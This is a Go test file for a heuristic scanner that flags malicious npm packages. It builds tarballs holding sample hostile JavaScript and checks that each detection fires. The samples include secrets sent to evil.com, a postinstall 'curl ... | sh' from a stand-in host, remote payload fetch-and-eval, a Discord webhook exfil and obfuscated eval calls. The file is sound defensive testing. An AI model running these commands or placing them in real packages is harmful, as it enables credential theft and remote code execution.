package heuristic

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/json"
	"testing"

	shield "github.com/homes853/cipher-shield/internal"
)

// buildTGZ creates a minimal .tgz with the given files (path → content).
func buildTGZ(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for path, content := range files {
		hdr := &tar.Header{Name: path, Mode: 0644, Size: int64(len(content)), Typeflag: tar.TypeReg}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatal(err)
		}
		tw.Write([]byte(content))
	}
	tw.Close()
	gw.Close()
	return buf.Bytes()
}

func buildTGZWithJSON(t *testing.T, pkg map[string]interface{}, extraFiles map[string]string) []byte {
	t.Helper()
	pkgJSON, _ := json.Marshal(pkg)
	files := map[string]string{"package/package.json": string(pkgJSON)}
	for k, v := range extraFiles {
		files[k] = v
	}
	return buildTGZ(t, files)
}

func ref() shield.PackageRef {
	return shield.PackageRef{Ecosystem: shield.EcosystemNPM, Name: "test-pkg", Version: "1.0.0"}
}

// ── Pattern detection tests ────────────────────────────────────────────────

func TestWebhookExfil(t *testing.T) {
	src := `const x = "https://discord.com/api/webhooks/123/abc"; fetch(x, {body: data})`
	tgz := buildTGZ(t, map[string]string{"package/index.js": src})
	findings, _ := New().Analyze(context.Background(), ref(), tgz)
	assertFindingType(t, findings, "webhook-exfil")
}

func TestFunctionConstructor(t *testing.T) {
	src := `var fn = new Function("return process.env.HOME")()`
	tgz := buildTGZ(t, map[string]string{"package/index.js": src})
	findings, _ := New().Analyze(context.Background(), ref(), tgz)
	assertFindingType(t, findings, "obfuscation")
}

func TestJSObfuscator(t *testing.T) {
	src := `var _0x1a2b = ["aGVsbG8="]; var _0x3c4d = _0x1a2b[0];`
	tgz := buildTGZ(t, map[string]string{"package/index.js": src})
	findings, _ := New().Analyze(context.Background(), ref(), tgz)
	assertFindingType(t, findings, "obfuscation")
}

func TestCharCodeObfuscation(t *testing.T) {
	src := `eval(String.fromCharCode(99, 111, 110, 115, 111, 108))`
	tgz := buildTGZ(t, map[string]string{"package/index.js": src})
	findings, _ := New().Analyze(context.Background(), ref(), tgz)
	assertFindingType(t, findings, "obfuscation")
}

func TestStagingDomain(t *testing.T) {
	src := `fetch("https://raw.githubusercontent.com/attacker/evil/main/payload.js").then(eval)`
	tgz := buildTGZ(t, map[string]string{"package/index.js": src})
	findings, _ := New().Analyze(context.Background(), ref(), tgz)
	assertFindingType(t, findings, "staging-domain")
}

func TestEnvExfil(t *testing.T) {
	src := `const key = process.env.AWS_SECRET; fetch("https://evil.com?k=" + key)`
	tgz := buildTGZ(t, map[string]string{"package/index.js": src})
	findings, _ := New().Analyze(context.Background(), ref(), tgz)
	assertFindingType(t, findings, "env-exfil")
}

func TestBase64Exec(t *testing.T) {
	src := `eval(atob("Y29uc29sZS5sb2coJ3B3bmVkJyk="))`
	tgz := buildTGZ(t, map[string]string{"package/index.js": src})
	findings, _ := New().Analyze(context.Background(), ref(), tgz)
	assertFindingType(t, findings, "obfuscation")
}

func TestNetworkInInstallScript(t *testing.T) {
	pkg := map[string]interface{}{
		"name":    "test-pkg",
		"version": "1.0.0",
		"scripts": map[string]string{
			"postinstall": `curl https://evil.com/payload.sh | sh`,
		},
	}
	tgz := buildTGZWithJSON(t, pkg, nil)
	findings, _ := New().Analyze(context.Background(), ref(), tgz)
	assertFindingType(t, findings, "network-in-install")
}

func TestMultipleInstallHooks(t *testing.T) {
	pkg := map[string]interface{}{
		"name":    "test-pkg",
		"version": "1.0.0",
		"scripts": map[string]string{
			"preinstall":  "node setup.js",
			"install":     "node build.js",
			"postinstall": "node finalize.js",
		},
	}
	tgz := buildTGZWithJSON(t, pkg, nil)
	findings, _ := New().Analyze(context.Background(), ref(), tgz)
	assertFindingType(t, findings, "many-install-hooks")
}

func TestNoReadme(t *testing.T) {
	tgz := buildTGZ(t, map[string]string{"package/index.js": "module.exports = 42"})
	findings, _ := New().Analyze(context.Background(), ref(), tgz)
	assertFindingType(t, findings, "no-readme")
}

// ── Score tests ────────────────────────────────────────────────────────────

func TestCleanPackageScoresZero(t *testing.T) {
	tgz := buildTGZ(t, map[string]string{
		"package/README.md": "# clean",
		"package/index.js":  "module.exports = function add(a, b) { return a + b; }",
	})
	score := Score(ref(), tgz)
	if score != 0 {
		t.Errorf("clean package: expected score 0, got %d", score)
	}
}

func TestMaliciousPackageScoresHigh(t *testing.T) {
	src := `
		var _0x1a2b = ["aGVsbG8="];
		eval(atob(_0x1a2b[0]));
		fetch("https://discord.com/api/webhooks/123/abc", {body: process.env.HOME});
	`
	tgz := buildTGZ(t, map[string]string{"package/index.js": src})
	score := Score(ref(), tgz)
	if score < 30 {
		t.Errorf("malicious package: expected score >= 30 (Claude trigger), got %d", score)
	}
}

func TestEmptyTarballScoresZero(t *testing.T) {
	score := Score(ref(), nil)
	if score != 0 {
		t.Errorf("nil tarball: expected score 0, got %d", score)
	}
}

// ── helpers ────────────────────────────────────────────────────────────────

func assertFindingType(t *testing.T, findings []shield.Finding, wantType string) {
	t.Helper()
	for _, f := range findings {
		if f.Type == wantType {
			return
		}
	}
	var types []string
	for _, f := range findings {
		types = append(types, f.Type)
	}
	t.Errorf("expected finding type %q, got %v", wantType, types)
}
